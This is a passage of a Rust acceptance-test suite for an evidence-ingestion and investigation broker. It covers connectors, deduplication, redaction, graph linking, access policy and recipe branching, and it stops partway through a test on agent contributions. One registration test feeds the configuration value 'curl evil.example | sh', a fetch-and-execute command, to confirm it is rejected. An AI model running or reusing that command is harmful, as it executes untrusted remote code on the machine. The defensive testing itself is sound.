// Acceptance tests of Work Capture & Evidence Ingestion, numbered after the specification's
// mandatory list (1-22), plus the end-to-end demonstration and store persistence. They run against
// the deterministic fixture scenario (src/capture/fixtures/failed_deployment.json).

use std::collections::BTreeSet;

use serde_json::{json, Value};

use super::broker::proposals::{ProposalStatus, RecipeProposal};
use super::broker::recipe::{
    failed_deployment, Budget, Predicate, RecipeBook, RecipeRef, RecipeStep, EXPLORATION_PREFIX,
};
use super::broker::run::{
    EvidenceQueryBroker, ExecutionMode, ReplayFidelity, StepState, StopReason,
};
use super::correlate::assertions::{hypothesis, trace, AssertionStatus, Claim, DerivationMethod};
use super::correlate::graph::{
    Direction, EvidenceGraph, LimitHit, TraversalRequest, HARD_MAX_DEPTH,
};
use super::correlate::link::{link, LinkContext};
use super::correlate::model::{
    entity_id, Entity, EntityKind, NodeRef, Relation, RelationStatus, RelationType,
};
use super::demo::{self, Scenario};
use super::format::record::{EvidenceType, ParseStatus, Payload};
use super::ingest::contributions::{
    transition_allowed, ContributionStatus, ContributionType, Locality, Namespace, Proposal,
    TargetKind, TargetRef,
};
use super::ingest::episode::{EpisodeOutcome, Question, QuestionState, WorkEpisode};
use super::ingest::pack::{InvestigationStatus, SourceState, WarningKind};
use super::resources::connector::{
    ConnectorStatus, QueryScope, QuerySpec, ResourceConnector, SourceRecord,
};
use super::resources::fixture::{FixtureBehavior, FixtureConnector};
use super::resources::registry::{ResourceRegistry, ResourceStatus};
use super::store::{CaptureStore, IngestKind, IngestPath};
use super::{AccessPolicy, Actor, ActorKind, Clock, ErrorCode, Sensitivity, Truth};
use crate::telemetry::model::Telemetry;

/** Load the scenario, optionally changed
 * Input
    - change: impl FnOnce(&mut Scenario) - modification
 * Output
    - Scenario
*/
fn scenario_with(change: impl FnOnce(&mut Scenario)) -> Scenario {
    let mut scenario = demo::scenario().expect("fixture loads");
    change(&mut scenario);
    scenario
}

/** Find a fixture resource of a scenario
 * Input
    - scenario: &mut Scenario - scenario
    - id: &str - resource id
 * Output
    - &mut demo::FixtureResource
*/
fn resource<'a>(scenario: &'a mut Scenario, id: &str) -> &'a mut demo::FixtureResource {
    scenario
        .resources
        .iter_mut()
        .find(|resource| resource.resource_id == id)
        .expect("fixture resource")
}

/** Build a broker over a scenario with a fixed clock
 * Input
    - scenario: &Scenario - scenario
 * Output
    - EvidenceQueryBroker
*/
fn broker(scenario: &Scenario) -> EvidenceQueryBroker {
    demo::broker(scenario, Clock::fixed(demo::DEMO_EPOCH)).expect("broker builds")
}

/** Run the scenario's investigation
 * Input
    - scenario: &Scenario - scenario
 * Output
    - (EvidenceQueryBroker, crate::capture::broker::run::EvidenceQueryResult)
*/
fn investigate(
    scenario: &Scenario,
) -> (
    EvidenceQueryBroker,
    crate::capture::broker::run::EvidenceQueryResult,
) {
    let mut broker = broker(scenario);
    let result = broker
        .investigate(demo::request(scenario), &demo::engineer(scenario))
        .expect("investigation runs");
    (broker, result)
}

/** A source record for direct ingestion tests
 * Input
    - id: &str - record id
    - evidence_type: EvidenceType - type
    - content: Value - content
    - timestamp: Option<u64> - source time
 * Output
    - SourceRecord
*/
fn record(
    id: &str,
    evidence_type: EvidenceType,
    content: Value,
    timestamp: Option<u64>,
) -> SourceRecord {
    SourceRecord {
        record_id: id.into(),
        evidence_type,
        media_type: "application/json".into(),
        content,
        source_timestamp: timestamp,
        source_revision: Some("1".into()),
        metadata: Default::default(),
    }
}

/** The relation of a type between two entities, if any
 * Input
    - graph: &EvidenceGraph - graph
    - relation_type: RelationType - type
    - source: (EntityKind, &str) - source kind and key
    - target: (EntityKind, &str) - target kind and key
 * Output
    - Option<Relation>
*/
fn relation(
    graph: &EvidenceGraph,
    relation_type: RelationType,
    source: (EntityKind, &str),
    target: (EntityKind, &str),
) -> Option<Relation> {
    let source = NodeRef::Entity(entity_id(source.0, source.1));
    let target = NodeRef::Entity(entity_id(target.0, target.1));
    graph
        .relations
        .values()
        .find(|relation| {
            relation.relation_type == relation_type
                && relation.source == source
                && relation.target == target
        })
        .cloned()
}

/** 1. A valid resource registers; an unknown connector type, a wildcard scope, a raw secret as
 * credential reference, and an undeclared configuration key are rejected
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn registers_resources_and_rejects_invalid_connectors() {
    let scenario = demo::scenario().unwrap();
    let base = demo::definition(&scenario.resources[0], &scenario);
    let mut registry = ResourceRegistry::default();
    registry.register(base.clone(), 5).unwrap();
    assert_eq!(registry.get("tracker").unwrap().created_at, 5);
    let mut unknown = base.clone();
    unknown.connector_type = "shell".into();
    assert_eq!(
        registry.register(unknown, 6).unwrap_err().code,
        ErrorCode::UnknownConnector
    );
    let mut wildcard = base.clone();
    wildcard.scope.repositories = vec!["acme/*".into()];
    assert_eq!(
        registry.register(wildcard, 6).unwrap_err().code,
        ErrorCode::InvalidRegistration
    );
    let mut secret = base.clone();
    secret.auth_reference = Some("ghp_0123456789abcdefghijklmnopqrstuvwxyz".into());
    assert_eq!(
        registry.register(secret, 6).unwrap_err().code,
        ErrorCode::InvalidRegistration
    );
    let mut command = base.clone();
    command
        .configuration
        .insert("command".into(), "curl evil.example | sh".into());
    assert_eq!(
        registry.register(command, 6).unwrap_err().code,
        ErrorCode::InvalidRegistration
    );
    let mut changed = base;
    changed
        .configuration
        .insert("fixture".into(), "other".into());
    assert!(
        registry.register(changed.clone(), 7).is_err(),
        "a configuration change must raise its version"
    );
    changed.configuration_version = 2;
    registry.register(changed, 7).unwrap();
    assert_eq!(registry.get("tracker").unwrap().created_at, 5);
    registry
        .set_status("tracker", ResourceStatus::Disabled, 8)
        .unwrap();
    assert_eq!(
        registry.get("tracker").unwrap().status,
        ResourceStatus::Disabled
    );
}

/** 2. Connector success, partial result, timeout, unauthorized, and unavailable outcomes stay
 * structured, and the broker never turns a failure into an empty success
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn connector_outcomes_are_structured() {
    let records = vec![
        record(
            "a",
            EvidenceType::CiRun,
            json!({"commit": "c1", "status": "success"}),
            Some(1),
        ),
        record(
            "b",
            EvidenceType::CiRun,
            json!({"commit": "c1", "status": "success"}),
            Some(2),
        ),
    ];
    let spec = QuerySpec {
        evidence_type: None,
        filters: Default::default(),
        since: None,
        until: None,
        limit: 10,
        cursor: None,
        scope: QueryScope::default(),
    };
    let normal = FixtureConnector::new(records.clone());
    assert_eq!(normal.query(&spec).status, ConnectorStatus::Ok);
    assert_eq!(normal.query(&spec).records.len(), 2);
    assert_eq!(normal.get_metadata("a").records[0].content, Value::Null);
    assert_eq!(normal.calls(), 3);
    let paged = normal.query(&QuerySpec {
        limit: 1,
        ..spec.clone()
    });
    assert_eq!(paged.next_cursor.as_deref(), Some("1"));
    let partial = FixtureConnector::new(records.clone())
        .with_behavior(FixtureBehavior::Partial(1))
        .query(&spec);
    assert_eq!(
        (partial.status, partial.records.len()),
        (ConnectorStatus::Partial, 1)
    );
    assert!(partial.error.is_some());
    for status in [
        ConnectorStatus::Timeout,
        ConnectorStatus::Unauthorized,
        ConnectorStatus::Unavailable,
    ] {
        let failed =
            FixtureConnector::new(records.clone()).with_behavior(FixtureBehavior::Fail(status));
        let outcome = failed.query(&spec);
        assert_eq!(outcome.status, status);
        assert!(outcome.records.is_empty() && outcome.error.is_some());
        assert!(!failed.health_check().available);
    }
    let mut scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    broker.connectors.insert(
        "ci".into(),
        Box::new(
            FixtureConnector::new(resource(&mut scenario, "ci").records.clone())
                .with_behavior(FixtureBehavior::Fail(ConnectorStatus::Timeout)),
        ),
    );
    let result = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let ci = result
        .pack
        .sources
        .iter()
        .find(|source| source.step_id == "ci")
        .unwrap();
    assert_eq!(ci.state, SourceState::Unavailable);
    assert!(ci.detail.contains("Timeout"));
    let missing = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::CiRun)
        .unwrap();
    assert_eq!(missing.state, SourceState::Unavailable);
    assert!(result.audit.metrics.connector_failures >= 1);
}

/** 3. A repeated webhook delivery, a retry through another path, and a duplicate record produce
 * one evidence record that keeps every observing path; a changed revision supersedes it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn deduplicates_repeated_deliveries() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[2], &scenario);
    let mut store = CaptureStore::in_memory();
    let run = record(
        "run-1",
        EvidenceType::CiRun,
        json!({"commit": "c1", "status": "success"}),
        Some(10),
    );
    let webhook = IngestPath {
        kind: "webhook".into(),
        id: "delivery-1".into(),
    };
    let first = store.ingest(&definition, &run, &webhook, None, None, 100);
    assert_eq!(first.kind, IngestKind::New);
    assert_eq!(
        store
            .ingest(&definition, &run, &webhook, None, None, 101)
            .kind,
        IngestKind::Duplicate
    );
    let retry = store.ingest(
        &definition,
        &run,
        &IngestPath {
            kind: "retry".into(),
            id: "poll-7".into(),
        },
        None,
        None,
        102,
    );
    assert_eq!(
        (retry.kind, retry.evidence_id.clone()),
        (IngestKind::Duplicate, first.evidence_id.clone())
    );
    assert_eq!(store.evidence.len(), 1);
    let paths = &store.evidence[&first.evidence_id]
        .provenance
        .ingestion_paths;
    assert_eq!(
        paths,
        &vec!["webhook:delivery-1".to_string(), "retry:poll-7".to_string()]
    );
    let artifact = store.artifacts.values().next().unwrap();
    assert_eq!(artifact.observed_via.len(), 2);
    let mut changed = run.clone();
    changed.source_revision = Some("2".into());
    changed.content = json!({"commit": "c1", "status": "failure"});
    let revision = store.ingest(
        &definition,
        &changed,
        &IngestPath {
            kind: "webhook".into(),
            id: "delivery-2".into(),
        },
        None,
        None,
        103,
    );
    assert_eq!(revision.kind, IngestKind::NewRevision);
    assert_eq!(
        store.evidence[&revision.evidence_id].supersedes.as_deref(),
        Some(first.evidence_id.as_str())
    );
    store.set_cursor("ci", "delivery-2");
    assert_eq!(store.cursor("ci").map(String::as_str), Some("delivery-2"));
}

/** 4. Event time and ingestion time stay separate; a record without a time keeps None
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn separates_observed_and_ingestion_time() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[2], &scenario);
    let mut store = CaptureStore::in_memory();
    let path = IngestPath {
        kind: "query".into(),
        id: "q".into(),
    };
    let timed = store.ingest(
        &definition,
        &record(
            "r1",
            EvidenceType::CiRun,
            json!({"commit": "c", "status": "success"}),
            Some(1_000),
        ),
        &path,
        None,
        None,
        9_000,
    );
    let evidence = &store.evidence[&timed.evidence_id];
    assert_eq!(
        (evidence.observed_at, evidence.ingested_at),
        (Some(1_000), 9_000)
    );
    let untimed = store.ingest(
        &definition,
        &record(
            "r2",
            EvidenceType::CiRun,
            json!({"commit": "c", "status": "success"}),
            None,
        ),
        &path,
        None,
        None,
        9_500,
    );
    let evidence = &store.evidence[&untimed.evidence_id];
    assert_eq!(evidence.observed_at, None);
    assert!(evidence
        .parse_issues
        .iter()
        .any(|issue| issue.field == "observed_at"));
    assert_eq!(store.evidence_in_window(500, 1_500, 10).len(), 1);
}

/** 5. Valid, malformed, and partially valid evidence parse as parsed, failed, and partially
 * parsed; missing values are never defaulted
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn parses_valid_malformed_and_partial_evidence() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[2], &scenario);
    let mut store = CaptureStore::in_memory();
    let path = IngestPath {
        kind: "query".into(),
        id: "q".into(),
    };
    let mut ingest = |id: &str, kind: EvidenceType, content: Value| {
        let outcome = store.ingest(
            &definition,
            &record(id, kind, content, Some(1)),
            &path,
            None,
            None,
            2,
        );
        store.evidence[&outcome.evidence_id].clone()
    };
    let valid = ingest(
        "v",
        EvidenceType::CiRun,
        json!({"commit": "c", "status": "failure"}),
    );
    assert_eq!(valid.parse_status, ParseStatus::Parsed);
    let malformed = ingest("m", EvidenceType::CiRun, json!("not an object"));
    assert_eq!(malformed.parse_status, ParseStatus::Failed);
    assert!(malformed.payload.is_none());
    let partial = ingest(
        "p",
        EvidenceType::TestReport,
        json!({"commit": "c", "passed": "many"}),
    );
    assert_eq!(partial.parse_status, ParseStatus::PartiallyParsed);
    assert!(partial
        .parse_issues
        .iter()
        .any(|issue| issue.field == "failed" && issue.problem == "missing"));
    assert!(partial
        .parse_issues
        .iter()
        .any(|issue| issue.field == "passed" && issue.problem == "malformed"));
    assert_eq!(partial.field("failed"), None);
    let metric = ingest(
        "mt",
        EvidenceType::Metric,
        json!({"points": [{"name": "errors", "value": null}, {"name": "latency", "value": "slow"}, {"name": "rps", "value": 3.5}]}),
    );
    let Some(Payload::Measurement { points }) = &metric.payload else {
        panic!("measurement payload")
    };
    assert_eq!(
        (points[0].value, points[0].status),
        (None, Telemetry::Unobserved)
    );
    assert_eq!(points[1].value, None);
    assert_eq!(points[2].value, Some(3.5));
    assert_eq!(metric.parse_status, ParseStatus::PartiallyParsed);
    let log = ingest("l", EvidenceType::RuntimeLog, json!(42));
    assert_eq!(log.parse_status, ParseStatus::Failed);
}

/** 6. Normalization keeps the raw artifact reference and provenance, and secrets never reach the
 * stored content
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn preserves_artifacts_and_provenance() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let log = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog)
        .expect("log selected");
    let artifact = &broker.store.artifacts[&log.artifact.artifact_id];
    assert_eq!(
        (
            artifact.source_resource_id.as_str(),
            artifact.source_record_id.as_str()
        ),
        ("logs", "log-7731-1")
    );
    assert_eq!(log.artifact.content_hash, artifact.content_hash);
    assert_eq!(
        log.artifact.storage_reference,
        format!("blob:{}", artifact.content_hash.clone().unwrap())
    );
    assert_eq!(artifact.sensitivity, Sensitivity::Confidential);
    assert!(artifact.redactions >= 1);
    let blob = broker.store.blobs[artifact.content_hash.as_ref().unwrap()].to_string();
    assert!(!blob.contains("Sup3rS3cretValue") && blob.contains("REDACTED"));
    assert!(!serde_json::to_string(&result.pack)
        .unwrap()
        .contains("Sup3rS3cretValue"));
    let evidence = &broker.store.evidence[&log.evidence_id];
    assert_eq!(evidence.provenance.connector_type, "fixture");
    assert_eq!(
        (
            evidence.provenance.parser.as_str(),
            evidence.provenance.parser_version.as_str()
        ),
        ("text", "1")
    );
    assert_eq!(
        evidence.provenance.query_id.as_deref(),
        Some(result.audit.query_id.as_str())
    );
    assert_eq!(evidence.source_ref.revision.as_deref(), Some("1"));
}

/** 7. Task, pull request, commit, CI result, and deployment are linked through typed relations
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn links_task_change_ci_and_deployment() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let graph = &broker.store.graph;
    let declared = relation(
        graph,
        RelationType::ResultedIn,
        (EntityKind::Task, "PAY-142"),
        (EntityKind::PullRequest, "418"),
    )
    .expect("task to pull request");
    assert_eq!(declared.status, RelationStatus::Declared);
    assert_eq!(
        relation(
            graph,
            RelationType::Contains,
            (EntityKind::PullRequest, "418"),
            (EntityKind::Commit, "9f1c2ab7d4")
        )
        .unwrap()
        .status,
        RelationStatus::Observed
    );
    assert!(relation(
        graph,
        RelationType::Triggered,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::CiRun, "run-5521")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::ResultedIn,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::Deployment, "dep-7731")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::DeployedTo,
        (EntityKind::Deployment, "dep-7731"),
        (EntityKind::Environment, "production")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::Writes,
        (EntityKind::Commit, "9f1c2ab7d4"),
        (EntityKind::File, "app/refund_worker.py")
    )
    .is_some());
    let zone = relation(
        graph,
        RelationType::BelongsToZone,
        (EntityKind::File, "app/refunds.py"),
        (EntityKind::Zone, "refunds"),
    )
    .expect("file in zone");
    assert_eq!(zone.version_scope.as_deref(), Some("zone:refunds@v3"));
    assert!(relation(
        graph,
        RelationType::BelongsToFlow,
        (EntityKind::File, "app/refund_worker.py"),
        (EntityKind::Flow, "refund-flow")
    )
    .is_some());
    assert!(relation(
        graph,
        RelationType::GovernedBy,
        (EntityKind::Zone, "refunds"),
        (EntityKind::Policy, "refund_safety")
    )
    .is_some());
    let episode = result.pack.episode_id.clone().unwrap();
    assert!(relation(
        graph,
        RelationType::ExecutedDuring,
        (EntityKind::AgentSession, "ses_demo01"),
        (EntityKind::WorkEpisode, &episode)
    )
    .is_some());
    let deployment = entity_id(EntityKind::Deployment, "dep-7731");
    assert!(!broker.store.evidence_for_entity(&deployment, 10).is_empty());
    assert!(result
        .pack
        .entities
        .iter()
        .any(|entity| entity.entity_id == deployment));
}

/** 8. An assertion derived from other assertions traces back to the original evidence
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn traces_derived_assertions_to_evidence() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let verified = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "change_verified")
        .expect("derived assertion");
    assert_eq!(verified.truth(), Truth::No, "the deployment failed");
    assert!(verified.supporting.is_empty() && !verified.derived_from.is_empty());
    let lineage = trace(&verified.assertion_id, &broker.store.assertions, 4);
    assert!(lineage.complete);
    let deployment = result
        .pack
        .evidence
        .iter()
        .find(|evidence| evidence.evidence_type == EvidenceType::Deployment)
        .unwrap();
    assert!(lineage.evidence.contains(&deployment.evidence_id));
    assert!(lineage.chain.len() > 1);
    let (supported, _) = broker
        .store
        .assertions_for_evidence(&deployment.evidence_id);
    assert!(supported
        .iter()
        .any(|assertion| assertion.claim.predicate == "deployment_succeeded"));
    let shallow = trace(&verified.assertion_id, &broker.store.assertions, 0);
    assert!(!shallow.complete);
}

/** 9. A relation derived by a rule is stored as inferred, never as observed
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn keeps_inferred_relations_distinct() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[1], &scenario);
    let mut store = CaptureStore::in_memory();
    let pr = record(
        "77",
        EvidenceType::PullRequest,
        json!({"number": "77", "head_sha": "abc", "branch": "fix/pay-9-retry", "repository": "acme/payments"}),
        Some(1),
    );
    let outcome = store.ingest(
        &definition,
        &pr,
        &IngestPath {
            kind: "query".into(),
            id: "q".into(),
        },
        None,
        None,
        2,
    );
    let evidence = store.evidence[&outcome.evidence_id].clone();
    link(
        &mut store.graph,
        &evidence,
        &LinkContext {
            task: Some("PAY-9"),
            episode: None,
        },
    );
    let inferred = relation(
        &store.graph,
        RelationType::ResultedIn,
        (EntityKind::Task, "PAY-9"),
        (EntityKind::PullRequest, "77"),
    )
    .expect("inferred link");
    assert_eq!(inferred.status, RelationStatus::Inferred);
    assert_eq!(inferred.provenance.method, "branch_name_match");
    assert!(store
        .graph
        .relations
        .values()
        .all(
            |relation| !(relation.relation_type == RelationType::ResultedIn
                && relation.status == RelationStatus::Observed)
        ));
    let only_observed = TraversalRequest {
        start: vec![NodeRef::Entity(entity_id(EntityKind::Task, "PAY-9"))],
        relation_types: vec![RelationType::ResultedIn],
        statuses: vec![RelationStatus::Observed],
        direction: Direction::Both,
        max_depth: 2,
        max_results: 10,
        max_bytes: 100_000,
        at: None,
    };
    assert_eq!(
        store
            .graph
            .traverse(&only_observed, &|_| true)
            .unwrap()
            .nodes
            .len(),
        1
    );
    let bad = Relation::new(
        RelationType::Supports,
        NodeRef::Entity(entity_id(EntityKind::Task, "PAY-9")),
        NodeRef::Entity(entity_id(EntityKind::PullRequest, "77")),
        RelationStatus::Observed,
        "test",
        Vec::new(),
    );
    assert_eq!(
        store.graph.add_relation(bad).unwrap_err().code,
        ErrorCode::InvalidRelation
    );
}

/** 10. Traversal enforces depth, result, and payload limits and names its relation types
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn enforces_traversal_limits() {
    let mut graph = EvidenceGraph::default();
    let ids = (0..10)
        .map(|index| graph.add_entity(Entity::new(EntityKind::Service, &format!("svc-{index}"))))
        .collect::<Vec<_>>();
    for pair in ids.windows(2) {
        graph
            .add_relation(Relation::new(
                RelationType::Calls,
                NodeRef::Entity(pair[0].clone()),
                NodeRef::Entity(pair[1].clone()),
                RelationStatus::Declared,
                "test",
                Vec::new(),
            ))
            .unwrap();
    }
    let request = |depth: usize, results: usize, bytes: usize| TraversalRequest {
        start: vec![NodeRef::Entity(ids[0].clone())],
        relation_types: vec![RelationType::Calls],
        statuses: Vec::new(),
        direction: Direction::Outgoing,
        max_depth: depth,
        max_results: results,
        max_bytes: bytes,
        at: None,
    };
    let deep = graph
        .traverse(&request(2, 100, 1_000_000), &|_| true)
        .unwrap();
    assert_eq!((deep.nodes.len(), deep.depth_reached), (3, 2));
    assert!(deep.limits.contains(&LimitHit::Depth));
    let few = graph
        .traverse(&request(9, 3, 1_000_000), &|_| true)
        .unwrap();
    assert_eq!(few.nodes.len(), 3);
    assert!(few.limits.contains(&LimitHit::Results));
    let small = graph.traverse(&request(9, 100, 300), &|_| true).unwrap();
    assert!(small.limits.contains(&LimitHit::Bytes) && small.nodes.len() < 10);
    let clamped = graph
        .traverse(&request(100, 100, 1_000_000), &|_| true)
        .unwrap();
    assert_eq!(clamped.depth_reached, HARD_MAX_DEPTH);
    let hidden = graph
        .traverse(&request(9, 100, 1_000_000), &|node| node.id() != ids[3])
        .unwrap();
    assert_eq!((hidden.nodes.len(), hidden.hidden), (3, 1));
    let mut unnamed = request(2, 10, 1000);
    unnamed.relation_types.clear();
    assert_eq!(
        graph.traverse(&unnamed, &|_| true).unwrap_err().code,
        ErrorCode::InvalidQuery
    );
}

/** 11. A request that explicitly asks for a resource or repository the actor may not access is
 * rejected before any source is queried; an implicit step without a permitted resource is denied
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn rejects_unauthorized_queries() {
    let scenario = demo::scenario().unwrap();
    let mut policy = demo::engineer(&scenario);
    policy.resources.remove("logs");
    let mut explicit = demo::request(&scenario);
    explicit.resources = vec!["deploy".into(), "logs".into()];
    let mut broker = broker(&scenario);
    let rejected = broker.investigate(explicit, &policy).unwrap();
    assert_eq!(rejected.pack.status, InvestigationStatus::Rejected);
    assert_eq!(
        (
            rejected.audit.metrics.connector_calls,
            rejected.audit.usage.steps
        ),
        (0, 0)
    );
    assert!(rejected.audit.steps.is_empty() && rejected.pack.evidence.is_empty());
    assert!(rejected
        .audit
        .policy_decisions
        .iter()
        .any(|decision| decision.subject == "logs"
            && decision.effect == super::broker::run::Effect::Deny));
    let mut other_repository = demo::request(&scenario);
    other_repository.known.repository = Some("acme/ledger".into());
    assert_eq!(
        broker
            .investigate(other_repository, &demo::engineer(&scenario))
            .unwrap()
            .pack
            .status,
        InvestigationStatus::Rejected
    );
    let implicit = broker
        .investigate(demo::request(&scenario), &policy)
        .unwrap();
    let logs = implicit
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "deploy-logs")
        .unwrap();
    assert_eq!(logs.state, StepState::Denied);
    let missing = implicit
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::RuntimeLog)
        .unwrap();
    assert_eq!(missing.state, SourceState::Denied);
    assert!(implicit
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Access));
}

/** 12. A conditional recipe follows the branches whose conditions hold and skips the others
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn executes_conditional_recipes() {
    let (_, failed) = investigate(&demo::scenario().unwrap());
    let branch = |result: &crate::capture::broker::run::EvidenceQueryResult, step: &str| {
        result
            .audit
            .branches
            .iter()
            .find(|branch| branch.step_id == step)
            .map(|branch| branch.held)
    };
    assert_eq!(branch(&failed, "deploy-logs"), Some(true));
    assert_eq!(branch(&failed, "runtime-metrics"), Some(true));
    assert_eq!(branch(&failed, "schema"), Some(false));
    assert!(failed
        .audit
        .steps
        .iter()
        .filter(|step| step.step_id == "schema")
        .all(|step| step.state == StepState::Skipped));
    assert!(failed
        .pack
        .evidence
        .iter()
        .any(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog));
    let healthy = scenario_with(|scenario| {
        let deploy = resource(scenario, "deploy");
        deploy.records[0].content["status"] = json!("succeeded");
        deploy.records[0].content["migration"] = json!("true");
    });
    let (_, succeeded) = investigate(&healthy);
    assert_eq!(branch(&succeeded, "deploy-logs"), Some(false));
    assert_eq!(branch(&succeeded, "schema"), Some(true));
    assert!(!succeeded
        .pack
        .evidence
        .iter()
        .any(|evidence| evidence.evidence_type == EvidenceType::RuntimeLog));
    assert!(succeeded
        .pack
        .evidence
        .iter()
        .any(|evidence| evidence.evidence_type == EvidenceType::Configuration));
    assert!(!succeeded
        .pack
        .missing_evidence
        .iter()
        .any(|missing| missing.evidence_type == EvidenceType::RuntimeLog));
}

/** 13. The audit records the exact recipe version and digest, branch decisions, and query history
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn records_recipe_version_and_history() {
    let (broker, result) = investigate(&demo::scenario().unwrap());
    let recipe = result.audit.recipe.clone().unwrap();
    assert_eq!(
        (recipe.recipe_id.as_str(), recipe.version),
        ("failed-deployment", 1)
    );
    assert_eq!(
        result.audit.recipe_digest.as_deref(),
        Some(failed_deployment().digest().as_str())
    );
    assert_eq!(
        result.pack.retrieval.recipe_digest,
        failed_deployment().digest()
    );
    assert_eq!(result.pack.retrieval.branches, result.audit.branches);
    let order = result
        .audit
        .steps
        .iter()
        .map(|step| step.step_id.as_str())
        .collect::<Vec<_>>();
    assert_eq!(order.first(), Some(&"scope-zone"));
    let pull = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "pull-request")
        .unwrap();
    assert_eq!(pull.parameters, json!({"record": "418"}));
    assert_eq!(pull.record_ids, vec!["418".to_string()]);
    assert!(pull.snapshot.as_deref().unwrap().starts_with("fixture:"));
    let ci = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "ci")
        .unwrap();
    assert_eq!(ci.parameters["filters"]["commit"], json!("9f1c2ab7d4"));
    assert!(result
        .audit
        .scope
        .learned
        .iter()
        .any(|fact| fact.field == "commit" && fact.value == "9f1c2ab7d4"));
    assert_eq!(
        broker
            .store
            .audit(&result.audit.query_id)
            .unwrap()
            .pack_id
            .as_deref(),
        Some(result.pack.pack_id.as_str())
    );
    let mut book = RecipeBook::default();
    book.add(failed_deployment()).unwrap();
    let mut altered = failed_deployment();
    altered.steps.pop();
    assert_eq!(
        book.add(altered).unwrap_err().code,
        ErrorCode::InvalidRecipe
    );
    let mut invalid = failed_deployment();
    invalid.version = 2;
    invalid.steps[0].record = Some("{everything}".into());
    assert!(invalid.validate().is_err());
}

/** 14. Contradictory evidence is kept on both sides and no winner is selected
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn keeps_contradictions_unresolved() {
    let conflicting = scenario_with(|scenario| {
        let deploy = resource(scenario, "deploy");
        let mut canary = deploy.records[1].clone();
        canary.record_id = "check-canary-7731".into();
        canary.content = json!({"deployment": "dep-7731", "check": "canary", "healthy": true, "environment": "production"});
        deploy.records.push(canary);
    });
    let (_, result) = investigate(&conflicting);
    let deployment = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "deployment_succeeded")
        .unwrap();
    assert_eq!(deployment.status, AssertionStatus::Unresolved);
    assert_eq!(
        (deployment.supporting.len(), deployment.contradicting.len()),
        (1, 2)
    );
    assert!(deployment.conflicted());
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Conflict));
    let verified = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "change_verified")
        .unwrap();
    assert_eq!(verified.truth(), Truth::Unknown);
}

/** 15. Missing or unavailable evidence is unknown, never false
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn missing_evidence_is_unknown() {
    assert_eq!(Truth::from_option(None), Truth::Unknown);
    let (_, result) = investigate(&demo::scenario().unwrap());
    let tests = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "tests_passed")
        .unwrap();
    assert_eq!(
        (tests.truth(), tests.status),
        (Truth::Unknown, AssertionStatus::Unresolved)
    );
    assert!(tests.contradicting.is_empty());
    let missing = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::TestReport)
        .unwrap();
    assert_eq!(missing.state, SourceState::Empty);
    let metrics = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::Metric)
        .unwrap();
    assert_eq!(metrics.state, SourceState::Unavailable);
    assert!(result
        .pack
        .warnings
        .iter()
        .any(|warning| warning.kind == WarningKind::Uncertainty
            && warning.message.contains("tests_passed")));
    let ci = result
        .pack
        .assertions
        .iter()
        .find(|assertion| assertion.claim.predicate == "ci_passed")
        .unwrap();
    assert_eq!(
        (ci.truth(), ci.status),
        (Truth::Yes, AssertionStatus::Supported)
    );
}

/** 16. An agent's contribution is recorded as proposed and never trusted automatically
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn agent_contributions_stay_proposed() {
    let report = demo::run().unwrap();
    let hypothesis_contribution = report
        .contributions
        .iter()
        .find(|contribution| contribution.contribution_type == ContributionType::Hypothesis)
        .unwrap();
    assert_eq!(
        (
            hypothesis_contribution.status,
            hypothesis_contribution.namespace
        ),
        (ContributionStatus::Proposed, Namespace::AgentProposed)
    );
    assert_eq!(hypothesis_contribution.contributor_type, ActorKind::Agent);
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
